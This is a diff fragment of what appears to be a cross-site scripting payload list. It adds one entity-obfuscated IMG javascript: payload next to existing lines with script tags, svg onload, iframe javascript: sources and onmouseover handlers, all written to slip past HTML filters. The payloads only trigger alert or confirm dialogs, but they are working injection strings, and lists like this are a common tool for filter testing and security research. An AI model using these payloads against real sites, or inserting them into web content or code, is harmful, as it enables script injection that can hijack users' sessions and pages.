@@ -1574,3 +1574,4 @@ http://www.google<script .com>alert(document.location)</script
 <svg/onload=alert(1)
 <input value=<><iframe/src=javascript:confirm(1)
 <input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+<IMG SRC=j&#X41vascript:alert('test2')>
